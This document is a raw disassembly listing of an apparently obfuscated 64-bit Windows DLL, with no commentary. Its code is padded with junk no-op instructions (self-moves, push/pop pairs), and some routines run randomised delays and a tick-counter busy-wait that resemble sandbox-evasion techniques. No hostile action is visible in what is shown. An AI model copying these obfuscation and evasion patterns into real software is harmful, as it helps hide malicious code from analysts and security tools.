   1800016a9:	51                   	push   %rcx
   1800016aa:	41 51                	push   %r9
   1800016ac:	41 59                	pop    %r9
   1800016ae:	59                   	pop    %rcx
   1800016af:	41 55                	push   %r13
   1800016b1:	48 87 e4             	xchg   %rsp,%rsp
   1800016b4:	48 89 db             	mov    %rbx,%rbx
   1800016b7:	41 5d                	pop    %r13
   1800016b9:	b8 01 00 00 00       	mov    $0x1,%eax
   1800016be:	c3                   	ret
   1800016bf:	90                   	nop
   1800016c0:	4d 8d 36             	lea    (%r14),%r14
   1800016c3:	48 8d 36             	lea    (%rsi),%rsi
   1800016c6:	48 89 ff             	mov    %rdi,%rdi
   1800016c9:	48 8d 12             	lea    (%rdx),%rdx
   1800016cc:	41 57                	push   %r15
   1800016ce:	56                   	push   %rsi
   1800016cf:	5e                   	pop    %rsi
   1800016d0:	41 5f                	pop    %r15
   1800016d2:	48 8d 12             	lea    (%rdx),%rdx
   1800016d5:	48 87 ff             	xchg   %rdi,%rdi
   1800016d8:	48 87 e4             	xchg   %rsp,%rsp
   1800016db:	4d 8d 36             	lea    (%r14),%r14
   1800016de:	b8 01 00 00 00       	mov    $0x1,%eax
   1800016e3:	c3                   	ret
   1800016e4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   1800016eb:	00 00 00 00 00 
   1800016f0:	48 8d 36             	lea    (%rsi),%rsi
   1800016f3:	4d 87 e4             	xchg   %r12,%r12
   1800016f6:	b8 01 00 00 00       	mov    $0x1,%eax
   1800016fb:	c3                   	ret
   1800016fc:	0f 1f 40 00          	nopl   0x0(%rax)
   180001700:	48 89 ed             	mov    %rbp,%rbp
   180001703:	48 89 db             	mov    %rbx,%rbx
   180001706:	b8 01 00 00 00       	mov    $0x1,%eax
   18000170b:	c3                   	ret
   18000170c:	0f 1f 40 00          	nopl   0x0(%rax)
   180001710:	56                   	push   %rsi
   180001711:	4d 89 ed             	mov    %r13,%r13
   180001714:	5e                   	pop    %rsi
   180001715:	b8 01 00 00 00       	mov    $0x1,%eax
   18000171a:	c3                   	ret
   18000171b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001720:	48 87 ed             	xchg   %rbp,%rbp
   180001723:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180001727:	4d 87 c0             	xchg   %r8,%r8
   18000172a:	48 8d 12             	lea    (%rdx),%rdx
   18000172d:	b8 01 00 00 00       	mov    $0x1,%eax
   180001732:	c3                   	ret
   180001733:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   18000173a:	84 00 00 00 00 00 
   180001740:	48 83 ec 38          	sub    $0x38,%rsp
   180001744:	b9 4a 03 00 00       	mov    $0x34a,%ecx
   180001749:	e8 92 00 00 00       	call   0x1800017e0
   18000174e:	90                   	nop
   18000174f:	90                   	nop
   180001750:	48 89 c0             	mov    %rax,%rax
   180001753:	e8 a8 00 00 00       	call   0x180001800
   180001758:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   18000175d:	31 c9                	xor    %ecx,%ecx
   18000175f:	31 d2                	xor    %edx,%edx
   180001761:	ff 15 f1 2a 02 00    	call   *0x22af1(%rip)        # 0x180024258
   180001767:	48 8d 00             	lea    (%rax),%rax
   18000176a:	48 87 f6             	xchg   %rsi,%rsi
   18000176d:	48 8d 00             	lea    (%rax),%rax
   180001770:	31 c9                	xor    %ecx,%ecx
   180001772:	ff 15 e8 2a 02 00    	call   *0x22ae8(%rip)        # 0x180024260
   180001778:	48 87 f6             	xchg   %rsi,%rsi
   18000177b:	90                   	nop
   18000177c:	e8 ff fb ff ff       	call   0x180001380
   180001781:	52                   	push   %rdx
   180001782:	4d 8d 1b             	lea    (%r11),%r11
   180001785:	48 89 ed             	mov    %rbp,%rbp
   180001788:	5a                   	pop    %rdx
   180001789:	b9 00 04 00 00       	mov    $0x400,%ecx
   18000178e:	ba 01 00 00 00       	mov    $0x1,%edx
   180001793:	ff 15 af 2b 02 00    	call   *0x22baf(%rip)        # 0x180024348
   180001799:	53                   	push   %rbx
   18000179a:	41 50                	push   %r8
   18000179c:	41 58                	pop    %r8
   18000179e:	5b                   	pop    %rbx
   18000179f:	c7 44 24 2c 6a 66 b5 	movl   $0xb5666a,0x2c(%rsp)
   1800017a6:	00 
   1800017a7:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800017ab:	41 55                	push   %r13
   1800017ad:	57                   	push   %rdi
   1800017ae:	5f                   	pop    %rdi
   1800017af:	41 5d                	pop    %r13
   1800017b1:	e8 8a fe ff ff       	call   0x180001640
   1800017b6:	41 54                	push   %r12
   1800017b8:	48 89 e4             	mov    %rsp,%rsp
   1800017bb:	41 5c                	pop    %r12
   1800017bd:	50                   	push   %rax
   1800017be:	57                   	push   %rdi
   1800017bf:	5f                   	pop    %rdi
   1800017c0:	58                   	pop    %rax
   1800017c1:	48 87 e4             	xchg   %rsp,%rsp
   1800017c4:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   1800017c8:	50                   	push   %rax
   1800017c9:	51                   	push   %rcx
   1800017ca:	59                   	pop    %rcx
   1800017cb:	58                   	pop    %rax
   1800017cc:	b8 01 00 00 00       	mov    $0x1,%eax
   1800017d1:	48 83 c4 38          	add    $0x38,%rsp
   1800017d5:	c3                   	ret
   1800017d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1800017dd:	00 00 00 
   1800017e0:	48 83 ec 28          	sub    $0x28,%rsp
   1800017e4:	ff 15 f6 2b 02 00    	call   *0x22bf6(%rip)        # 0x1800243e0
   1800017ea:	90                   	nop
   1800017eb:	48 83 c4 28          	add    $0x28,%rsp
   1800017ef:	e9 9c 06 00 00       	jmp    0x180001e90
   1800017f4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   1800017fb:	00 00 00 00 00 
   180001800:	50                   	push   %rax
   180001801:	50                   	push   %rax
   180001802:	48 89 c0             	mov    %rax,%rax
   180001805:	58                   	pop    %rax
   180001806:	90                   	nop
   180001807:	90                   	nop
   180001808:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   18000180c:	48 89 db             	mov    %rbx,%rbx
   18000180f:	4d 87 e4             	xchg   %r12,%r12
   180001812:	41 57                	push   %r15
   180001814:	4d 87 d2             	xchg   %r10,%r10
   180001817:	41 5f                	pop    %r15
   180001819:	50                   	push   %rax
   18000181a:	58                   	pop    %rax
   18000181b:	51                   	push   %rcx
   18000181c:	90                   	nop
   18000181d:	59                   	pop    %rcx
   18000181e:	48 8d 3f             	lea    (%rdi),%rdi
   180001821:	48 8d 00             	lea    (%rax),%rax
   180001824:	4d 87 ed             	xchg   %r13,%r13
   180001827:	48 87 db             	xchg   %rbx,%rbx
   18000182a:	48 8d 36             	lea    (%rsi),%rsi
   18000182d:	48 87 d2             	xchg   %rdx,%rdx
   180001830:	90                   	nop
   180001831:	90                   	nop
   180001832:	c7 44 24 04 5f 02 00 	movl   $0x25f,0x4(%rsp)
   180001839:	00 
   18000183a:	58                   	pop    %rax
   18000183b:	c3                   	ret
   18000183c:	0f 1f 40 00          	nopl   0x0(%rax)
   180001840:	48 81 ec 28 02 00 00 	sub    $0x228,%rsp
   180001847:	b9 35 02 00 00       	mov    $0x235,%ecx
   18000184c:	e8 8f 00 00 00       	call   0x1800018e0
   180001851:	41 53                	push   %r11
   180001853:	48 89 c0             	mov    %rax,%rax
   180001856:	41 5b                	pop    %r11
   180001858:	48 87 ed             	xchg   %rbp,%rbp
   18000185b:	4d 87 ed             	xchg   %r13,%r13
   18000185e:	48 89 db             	mov    %rbx,%rbx
   180001861:	48 89 ff             	mov    %rdi,%rdi
   180001864:	e8 97 00 00 00       	call   0x180001900
   180001869:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   18000186e:	b9 04 01 00 00       	mov    $0x104,%ecx
   180001873:	ff 15 57 29 02 00    	call   *0x22957(%rip)        # 0x1800241d0
   180001879:	48 8d 12             	lea    (%rdx),%rdx
   18000187c:	90                   	nop
   18000187d:	48 8d 12             	lea    (%rdx),%rdx
   180001880:	48 89 c0             	mov    %rax,%rax
   180001883:	e8 b8 00 00 00       	call   0x180001940
   180001888:	90                   	nop
   180001889:	90                   	nop
   18000188a:	90                   	nop
   18000188b:	ff 15 47 2a 02 00    	call   *0x22a47(%rip)        # 0x1800242d8
   180001891:	4d 8d 00             	lea    (%r8),%r8
   180001894:	48 87 e4             	xchg   %rsp,%rsp
   180001897:	48 89 db             	mov    %rbx,%rbx
   18000189a:	c7 44 24 20 f0 4d ae 	movl   $0xae4df0,0x20(%rsp)
   1800018a1:	00 
   1800018a2:	8b 44 24 20          	mov    0x20(%rsp),%eax
   1800018a6:	4d 89 ed             	mov    %r13,%r13
   1800018a9:	4d 87 e4             	xchg   %r12,%r12
   1800018ac:	48 89 c0             	mov    %rax,%rax
   1800018af:	48 87 d2             	xchg   %rdx,%rdx
   1800018b2:	48 89 c0             	mov    %rax,%rax
   1800018b5:	52                   	push   %rdx
   1800018b6:	48 87 db             	xchg   %rbx,%rbx
   1800018b9:	5a                   	pop    %rdx
   1800018ba:	e8 c1 fa ff ff       	call   0x180001380
   1800018bf:	4d 87 f6             	xchg   %r14,%r14
   1800018c2:	48 89 ff             	mov    %rdi,%rdi
   1800018c5:	4d 89 c9             	mov    %r9,%r9
   1800018c8:	90                   	nop
   1800018c9:	48 8d 12             	lea    (%rdx),%rdx
   1800018cc:	50                   	push   %rax
   1800018cd:	90                   	nop
   1800018ce:	58                   	pop    %rax
   1800018cf:	b8 01 00 00 00       	mov    $0x1,%eax
   1800018d4:	48 81 c4 28 02 00 00 	add    $0x228,%rsp
   1800018db:	c3                   	ret
   1800018dc:	0f 1f 40 00          	nopl   0x0(%rax)
   1800018e0:	48 83 ec 28          	sub    $0x28,%rsp
   1800018e4:	31 d2                	xor    %edx,%edx
   1800018e6:	ff 15 fc 2a 02 00    	call   *0x22afc(%rip)        # 0x1800243e8
   1800018ec:	56                   	push   %rsi
   1800018ed:	5e                   	pop    %rsi
   1800018ee:	90                   	nop
   1800018ef:	48 83 c4 28          	add    $0x28,%rsp
   1800018f3:	c3                   	ret
   1800018f4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   1800018fb:	00 00 00 00 00 
   180001900:	50                   	push   %rax
   180001901:	41 56                	push   %r14
   180001903:	48 8d 3f             	lea    (%rdi),%rdi
   180001906:	4d 8d 00             	lea    (%r8),%r8
   180001909:	41 5e                	pop    %r14
   18000190b:	4d 8d 36             	lea    (%r14),%r14
   18000190e:	4d 89 e4             	mov    %r12,%r12
   180001911:	48 89 db             	mov    %rbx,%rbx
   180001914:	48 89 f6             	mov    %rsi,%rsi
   180001917:	90                   	nop
   180001918:	41 52                	push   %r10
   18000191a:	90                   	nop
   18000191b:	41 5a                	pop    %r10
   18000191d:	48 89 ed             	mov    %rbp,%rbp
   180001920:	4d 89 c9             	mov    %r9,%r9
   180001923:	48 8d 3f             	lea    (%rdi),%rdi
   180001926:	90                   	nop
   180001927:	4d 8d 09             	lea    (%r9),%r9
   18000192a:	90                   	nop
   18000192b:	48 87 d2             	xchg   %rdx,%rdx
   18000192e:	41 51                	push   %r9
   180001930:	41 59                	pop    %r9
   180001932:	c7 44 24 04 02 03 00 	movl   $0x302,0x4(%rsp)
   180001939:	00 
   18000193a:	58                   	pop    %rax
   18000193b:	c3                   	ret
   18000193c:	0f 1f 40 00          	nopl   0x0(%rax)
   180001940:	50                   	push   %rax
   180001941:	41 53                	push   %r11
   180001943:	4d 89 ff             	mov    %r15,%r15
   180001946:	41 5b                	pop    %r11
   180001948:	41 54                	push   %r12
   18000194a:	90                   	nop
   18000194b:	41 5c                	pop    %r12
   18000194d:	4d 89 ed             	mov    %r13,%r13
   180001950:	90                   	nop
   180001951:	90                   	nop
   180001952:	90                   	nop
   180001953:	48 87 d2             	xchg   %rdx,%rdx
   180001956:	4d 89 e4             	mov    %r12,%r12
   180001959:	53                   	push   %rbx
   18000195a:	50                   	push   %rax
   18000195b:	58                   	pop    %rax
   18000195c:	5b                   	pop    %rbx
   18000195d:	52                   	push   %rdx
   18000195e:	90                   	nop
   18000195f:	5a                   	pop    %rdx
   180001960:	55                   	push   %rbp
   180001961:	48 87 f6             	xchg   %rsi,%rsi
   180001964:	5d                   	pop    %rbp
   180001965:	55                   	push   %rbp
   180001966:	48 87 c9             	xchg   %rcx,%rcx
   180001969:	5d                   	pop    %rbp
   18000196a:	41 56                	push   %r14
   18000196c:	41 52                	push   %r10
   18000196e:	41 5a                	pop    %r10
   180001970:	41 5e                	pop    %r14
   180001972:	4d 87 d2             	xchg   %r10,%r10
   180001975:	48 87 ff             	xchg   %rdi,%rdi
   180001978:	4d 87 db             	xchg   %r11,%r11
   18000197b:	56                   	push   %rsi
   18000197c:	48 87 f6             	xchg   %rsi,%rsi
   18000197f:	5e                   	pop    %rsi
   180001980:	c7 44 24 04 89 00 00 	movl   $0x89,0x4(%rsp)
   180001987:	00 
   180001988:	58                   	pop    %rax
   180001989:	c3                   	ret
   18000198a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180001990:	48 81 ec d8 00 00 00 	sub    $0xd8,%rsp
   180001997:	b9 47 01 00 00       	mov    $0x147,%ecx
   18000199c:	e8 9f 00 00 00       	call   0x180001a40
   1800019a1:	4d 8d 3f             	lea    (%r15),%r15
   1800019a4:	4d 89 f6             	mov    %r14,%r14
   1800019a7:	4d 89 e4             	mov    %r12,%r12
   1800019aa:	4d 89 db             	mov    %r11,%r11
   1800019ad:	48 8d 0d f4 f0 01 00 	lea    0x1f0f4(%rip),%rcx        # 0x180020aa8
   1800019b4:	ff 15 96 28 02 00    	call   *0x22896(%rip)        # 0x180024250
   1800019ba:	90                   	nop
   1800019bb:	48 87 ff             	xchg   %rdi,%rdi
   1800019be:	90                   	nop
   1800019bf:	e8 3c fe ff ff       	call   0x180001800
   1800019c4:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   1800019c9:	b9 00 04 00 00       	mov    $0x400,%ecx
   1800019ce:	ba 5c 00 00 00       	mov    $0x5c,%edx
   1800019d3:	41 b9 55 00 00 00    	mov    $0x55,%r9d
   1800019d9:	ff 15 59 28 02 00    	call   *0x22859(%rip)        # 0x180024238
   1800019df:	48 87 f6             	xchg   %rsi,%rsi
   1800019e2:	53                   	push   %rbx
   1800019e3:	90                   	nop
   1800019e4:	5b                   	pop    %rbx
   1800019e5:	41 51                	push   %r9
   1800019e7:	4d 87 c9             	xchg   %r9,%r9
   1800019ea:	48 89 e4             	mov    %rsp,%rsp
   1800019ed:	41 59                	pop    %r9
   1800019ef:	4d 89 c9             	mov    %r9,%r9
   1800019f2:	c7 44 24 20 45 2c 0e 	movl   $0xe2c45,0x20(%rsp)
   1800019f9:	00 
   1800019fa:	8b 44 24 20          	mov    0x20(%rsp),%eax
   1800019fe:	90                   	nop
   1800019ff:	90                   	nop
   180001a00:	41 53                	push   %r11
   180001a02:	90                   	nop
   180001a03:	41 5b                	pop    %r11
   180001a05:	e8 f6 fe ff ff       	call   0x180001900
   180001a0a:	48 8d 00             	lea    (%rax),%rax
   180001a0d:	4d 87 c9             	xchg   %r9,%r9
   180001a10:	4d 87 c0             	xchg   %r8,%r8
   180001a13:	48 89 ed             	mov    %rbp,%rbp
   180001a16:	48 89 e4             	mov    %rsp,%rsp
   180001a19:	4d 89 c0             	mov    %r8,%r8
   180001a1c:	48 8d 36             	lea    (%rsi),%rsi
   180001a1f:	48 8d 00             	lea    (%rax),%rax
   180001a22:	41 52                	push   %r10
   180001a24:	41 5a                	pop    %r10
   180001a26:	b8 01 00 00 00       	mov    $0x1,%eax
   180001a2b:	48 81 c4 d8 00 00 00 	add    $0xd8,%rsp
   180001a32:	c3                   	ret
   180001a33:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180001a3a:	84 00 00 00 00 00 
   180001a40:	31 d2                	xor    %edx,%edx
   180001a42:	48 ff 25 9f 29 02 00 	rex.W jmp *0x2299f(%rip)        # 0x1800243e8
   180001a49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001a50:	48 87 ed             	xchg   %rbp,%rbp
   180001a53:	90                   	nop
   180001a54:	4d 8d 3f             	lea    (%r15),%r15
   180001a57:	4d 87 c0             	xchg   %r8,%r8
   180001a5a:	4d 89 d2             	mov    %r10,%r10
   180001a5d:	48 8d 12             	lea    (%rdx),%rdx
   180001a60:	b8 01 00 00 00       	mov    $0x1,%eax
   180001a65:	c3                   	ret
   180001a66:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   180001a6d:	00 00 00 
   180001a70:	57                   	push   %rdi
   180001a71:	41 50                	push   %r8
   180001a73:	41 58                	pop    %r8
   180001a75:	5f                   	pop    %rdi
   180001a76:	b8 01 00 00 00       	mov    $0x1,%eax
   180001a7b:	c3                   	ret
   180001a7c:	0f 1f 40 00          	nopl   0x0(%rax)
   180001a80:	4d 89 ed             	mov    %r13,%r13
   180001a83:	57                   	push   %rdi
   180001a84:	5f                   	pop    %rdi
   180001a85:	48 89 f6             	mov    %rsi,%rsi
   180001a88:	48 8d 3f             	lea    (%rdi),%rdi
   180001a8b:	90                   	nop
   180001a8c:	b8 01 00 00 00       	mov    $0x1,%eax
   180001a91:	c3                   	ret
   180001a92:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180001a99:	1f 84 00 00 00 00 00 
   180001aa0:	48 81 ec 28 02 00 00 	sub    $0x228,%rsp
   180001aa7:	b9 66 03 00 00       	mov    $0x366,%ecx
   180001aac:	e8 9f 00 00 00       	call   0x180001b50
   180001ab1:	90                   	nop
   180001ab2:	4d 8d 00             	lea    (%r8),%r8
   180001ab5:	48 8d 0d 0a f0 01 00 	lea    0x1f00a(%rip),%rcx        # 0x180020ac6
   180001abc:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180001ac1:	ba 04 01 00 00       	mov    $0x104,%edx
   180001ac6:	45 31 c9             	xor    %r9d,%r9d
   180001ac9:	ff 15 51 27 02 00    	call   *0x22751(%rip)        # 0x180024220
   180001acf:	41 55                	push   %r13
   180001ad1:	4d 87 e4             	xchg   %r12,%r12
   180001ad4:	41 5d                	pop    %r13
   180001ad6:	41 54                	push   %r12
   180001ad8:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180001adc:	41 5c                	pop    %r12
   180001ade:	ff 15 9c 27 02 00    	call   *0x2279c(%rip)        # 0x180024280
   180001ae4:	ff 15 de 26 02 00    	call   *0x226de(%rip)        # 0x1800241c8
   180001aea:	41 50                	push   %r8
   180001aec:	41 57                	push   %r15
   180001aee:	41 5f                	pop    %r15
   180001af0:	41 58                	pop    %r8
   180001af2:	ff 15 f0 26 02 00    	call   *0x226f0(%rip)        # 0x1800241e8
   180001af8:	48 87 c9             	xchg   %rcx,%rcx
   180001afb:	48 87 d2             	xchg   %rdx,%rdx
   180001afe:	48 8d 3f             	lea    (%rdi),%rdi
   180001b01:	c7 44 24 20 01 16 e8 	movl   $0xe81601,0x20(%rsp)
   180001b08:	00 
   180001b09:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180001b0d:	56                   	push   %rsi
   180001b0e:	41 53                	push   %r11
   180001b10:	41 5b                	pop    %r11
   180001b12:	5e                   	pop    %rsi
   180001b13:	4d 8d 24 24          	lea    (%r12),%r12
   180001b17:	4d 8d 00             	lea    (%r8),%r8
   180001b1a:	48 89 e4             	mov    %rsp,%rsp
   180001b1d:	4d 87 c0             	xchg   %r8,%r8
   180001b20:	48 89 e4             	mov    %rsp,%rsp
   180001b23:	4d 89 ed             	mov    %r13,%r13
   180001b26:	4d 89 f6             	mov    %r14,%r14
   180001b29:	48 89 ff             	mov    %rdi,%rdi
   180001b2c:	48 89 d2             	mov    %rdx,%rdx
   180001b2f:	48 87 db             	xchg   %rbx,%rbx
   180001b32:	41 50                	push   %r8
   180001b34:	41 58                	pop    %r8
   180001b36:	b8 01 00 00 00       	mov    $0x1,%eax
   180001b3b:	48 81 c4 28 02 00 00 	add    $0x228,%rsp
   180001b42:	c3                   	ret
   180001b43:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180001b4a:	84 00 00 00 00 00 
   180001b50:	48 83 ec 28          	sub    $0x28,%rsp
   180001b54:	ff 15 86 28 02 00    	call   *0x22886(%rip)        # 0x1800243e0
   180001b5a:	41 55                	push   %r13
   180001b5c:	52                   	push   %rdx
   180001b5d:	5a                   	pop    %rdx
   180001b5e:	41 5d                	pop    %r13
   180001b60:	48 8d 00             	lea    (%rax),%rax
   180001b63:	48 8d 3f             	lea    (%rdi),%rdi
   180001b66:	48 8d 1b             	lea    (%rbx),%rbx
   180001b69:	90                   	nop
   180001b6a:	48 83 c4 28          	add    $0x28,%rsp
   180001b6e:	c3                   	ret
   180001b6f:	90                   	nop
   180001b70:	48 89 d2             	mov    %rdx,%rdx
   180001b73:	4d 8d 36             	lea    (%r14),%r14
   180001b76:	48 89 c9             	mov    %rcx,%rcx
   180001b79:	48 8d 36             	lea    (%rsi),%rsi
   180001b7c:	b8 01 00 00 00       	mov    $0x1,%eax
   180001b81:	c3                   	ret
   180001b82:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180001b89:	1f 84 00 00 00 00 00 
   180001b90:	56                   	push   %rsi
   180001b91:	48 81 ec d0 00 00 00 	sub    $0xd0,%rsp
   180001b98:	b9 8d 01 00 00       	mov    $0x18d,%ecx
   180001b9d:	e8 ee 00 00 00       	call   0x180001c90
   180001ba2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001ba7:	ff 15 83 26 02 00    	call   *0x22683(%rip)        # 0x180024230
   180001bad:	56                   	push   %rsi
   180001bae:	5e                   	pop    %rsi
   180001baf:	4d 87 db             	xchg   %r11,%r11
   180001bb2:	90                   	nop
   180001bb3:	48 8d 1b             	lea    (%rbx),%rbx
   180001bb6:	48 89 d2             	mov    %rdx,%rdx
   180001bb9:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001bbe:	ff 15 a4 26 02 00    	call   *0x226a4(%rip)        # 0x180024268
   180001bc4:	4d 89 e4             	mov    %r12,%r12
   180001bc7:	48 8d 12             	lea    (%rdx),%rdx
   180001bca:	4d 8d 36             	lea    (%r14),%r14
   180001bcd:	4d 89 c0             	mov    %r8,%r8
   180001bd0:	c7 44 24 20 62 d4 eb 	movl   $0xebd462,0x20(%rsp)
   180001bd7:	00 
   180001bd8:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180001bdc:	e8 df 00 00 00       	call   0x180001cc0
   180001be1:	41 56                	push   %r14
   180001be3:	4d 87 d2             	xchg   %r10,%r10
   180001be6:	41 5e                	pop    %r14
   180001be8:	b9 12 02 00 00       	mov    $0x212,%ecx
   180001bed:	e8 0e 01 00 00       	call   0x180001d00
   180001bf2:	4d 87 c9             	xchg   %r9,%r9
   180001bf5:	4d 89 ff             	mov    %r15,%r15
   180001bf8:	4d 89 e4             	mov    %r12,%r12
   180001bfb:	ff 15 c7 26 02 00    	call   *0x226c7(%rip)        # 0x1800242c8
   180001c01:	51                   	push   %rcx
   180001c02:	48 8d 12             	lea    (%rdx),%rdx
   180001c05:	59                   	pop    %rcx
   180001c06:	e8 f5 fb ff ff       	call   0x180001800
   180001c0b:	48 8b 35 96 26 02 00 	mov    0x22696(%rip),%rsi        # 0x1800242a8
   180001c12:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001c17:	ff d6                	call   *%rsi
   180001c19:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001c1e:	ff 15 ac 26 02 00    	call   *0x226ac(%rip)        # 0x1800242d0
   180001c24:	48 8d 3f             	lea    (%rdi),%rdi
   180001c27:	48 8d 3f             	lea    (%rdi),%rdi
   180001c2a:	90                   	nop
   180001c2b:	4d 8d 24 24          	lea    (%r12),%r12
   180001c2f:	55                   	push   %rbp
   180001c30:	53                   	push   %rbx
   180001c31:	5b                   	pop    %rbx
   180001c32:	5d                   	pop    %rbp
   180001c33:	c7 44 24 20 7e d4 32 	movl   $0x32d47e,0x20(%rsp)
   180001c3a:	00 
   180001c3b:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180001c3f:	4d 89 db             	mov    %r11,%r11
   180001c42:	90                   	nop
   180001c43:	48 8d 36             	lea    (%rsi),%rsi
   180001c46:	e8 05 01 00 00       	call   0x180001d50
   180001c4b:	48 87 ff             	xchg   %rdi,%rdi
   180001c4e:	48 8d 09             	lea    (%rcx),%rcx
   180001c51:	4d 8d 12             	lea    (%r10),%r10
   180001c54:	4d 89 db             	mov    %r11,%r11
   180001c57:	90                   	nop
   180001c58:	48 89 db             	mov    %rbx,%rbx
   180001c5b:	41 57                	push   %r15
   180001c5d:	4d 89 ff             	mov    %r15,%r15
   180001c60:	41 5f                	pop    %r15
   180001c62:	48 89 f6             	mov    %rsi,%rsi
   180001c65:	48 87 ed             	xchg   %rbp,%rbp
   180001c68:	48 8d 1b             	lea    (%rbx),%rbx
   180001c6b:	48 8d 00             	lea    (%rax),%rax
   180001c6e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001c73:	ff d6                	call   *%rsi
   180001c75:	8b 44 24 24          	mov    0x24(%rsp),%eax
   180001c79:	48 81 c4 d0 00 00 00 	add    $0xd0,%rsp
   180001c80:	5e                   	pop    %rsi
   180001c81:	c3                   	ret
   180001c82:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180001c89:	1f 84 00 00 00 00 00 
   180001c90:	56                   	push   %rsi
   180001c91:	48 83 ec 20          	sub    $0x20,%rsp
   180001c95:	89 ce                	mov    %ecx,%esi
   180001c97:	ff 15 2b 26 02 00    	call   *0x2262b(%rip)        # 0x1800242c8
   180001c9d:	83 e0 3f             	and    $0x3f,%eax
   180001ca0:	01 c6                	add    %eax,%esi
   180001ca2:	89 f1                	mov    %esi,%ecx
   180001ca4:	ff 15 36 27 02 00    	call   *0x22736(%rip)        # 0x1800243e0
   180001caa:	48 8d 3f             	lea    (%rdi),%rdi
   180001cad:	48 8d 00             	lea    (%rax),%rax
   180001cb0:	4d 87 f6             	xchg   %r14,%r14
   180001cb3:	90                   	nop
   180001cb4:	48 83 c4 20          	add    $0x20,%rsp
   180001cb8:	5e                   	pop    %rsi
   180001cb9:	c3                   	ret
   180001cba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180001cc0:	50                   	push   %rax
   180001cc1:	41 55                	push   %r13
   180001cc3:	41 54                	push   %r12
   180001cc5:	41 5c                	pop    %r12
   180001cc7:	41 5d                	pop    %r13
   180001cc9:	4d 89 c0             	mov    %r8,%r8
   180001ccc:	4d 8d 09             	lea    (%r9),%r9
   180001ccf:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180001cd3:	48 8d 36             	lea    (%rsi),%rsi
   180001cd6:	4d 87 e4             	xchg   %r12,%r12
   180001cd9:	48 89 f6             	mov    %rsi,%rsi
   180001cdc:	41 54                	push   %r12
   180001cde:	41 56                	push   %r14
   180001ce0:	41 5e                	pop    %r14
   180001ce2:	41 5c                	pop    %r12
   180001ce4:	4d 87 ff             	xchg   %r15,%r15
   180001ce7:	48 8d 36             	lea    (%rsi),%rsi
   180001cea:	48 89 db             	mov    %rbx,%rbx
   180001ced:	90                   	nop
   180001cee:	48 89 ed             	mov    %rbp,%rbp
   180001cf1:	48 89 ed             	mov    %rbp,%rbp
   180001cf4:	c7 44 24 04 37 02 00 	movl   $0x237,0x4(%rsp)
   180001cfb:	00 
   180001cfc:	58                   	pop    %rax
   180001cfd:	c3                   	ret
   180001cfe:	66 90                	xchg   %ax,%ax
   180001d00:	41 56                	push   %r14
   180001d02:	56                   	push   %rsi
   180001d03:	57                   	push   %rdi
   180001d04:	53                   	push   %rbx
   180001d05:	48 83 ec 28          	sub    $0x28,%rsp
   180001d09:	89 ce                	mov    %ecx,%esi
   180001d0b:	48 8b 1d b6 25 02 00 	mov    0x225b6(%rip),%rbx        # 0x1800242c8
   180001d12:	ff d3                	call   *%rbx
   180001d14:	89 c7                	mov    %eax,%edi
   180001d16:	ff d3                	call   *%rbx
   180001d18:	29 f8                	sub    %edi,%eax
   180001d1a:	39 f0                	cmp    %esi,%eax
   180001d1c:	73 1d                	jae    0x180001d3b
   180001d1e:	4c 8b 35 cb 26 02 00 	mov    0x226cb(%rip),%r14        # 0x1800243f0
   180001d25:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   180001d2c:	00 00 00 00 
   180001d30:	41 ff d6             	call   *%r14
   180001d33:	ff d3                	call   *%rbx
   180001d35:	29 f8                	sub    %edi,%eax
   180001d37:	39 f0                	cmp    %esi,%eax
   180001d39:	72 f5                	jb     0x180001d30
   180001d3b:	41 57                	push   %r15
   180001d3d:	41 5f                	pop    %r15
   180001d3f:	48 83 c4 28          	add    $0x28,%rsp
   180001d43:	5b                   	pop    %rbx
   180001d44:	5f                   	pop    %rdi
   180001d45:	5e                   	pop    %rsi
   180001d46:	41 5e                	pop    %r14
   180001d48:	c3                   	ret
   180001d49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001d50:	50                   	push   %rax
   180001d51:	41 53                	push   %r11
   180001d53:	41 5b                	pop    %r11
   180001d55:	48 8d 12             	lea    (%rdx),%rdx
   180001d58:	48 89 e4             	mov    %rsp,%rsp
   180001d5b:	55                   	push   %rbp
   180001d5c:	48 89 e4             	mov    %rsp,%rsp
